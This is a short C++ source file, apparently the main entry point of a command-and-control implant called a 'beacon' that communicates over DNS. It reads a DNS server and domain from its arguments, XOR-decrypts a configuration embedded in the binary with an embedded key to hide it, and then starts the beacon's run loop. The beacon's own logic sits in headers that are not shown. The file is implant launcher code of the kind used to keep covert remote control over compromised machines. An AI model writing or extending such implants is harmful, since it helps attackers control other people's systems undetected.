#include "BeaconDns.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string dnsServer = "";
	if(argc > 1)
		dnsServer = argv[1];

	std::string domain = "";
	if (argc > 2)
		domain = argv[2];

	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconDns>(configDecrypt, dnsServer, domain);

	beacon->run();
}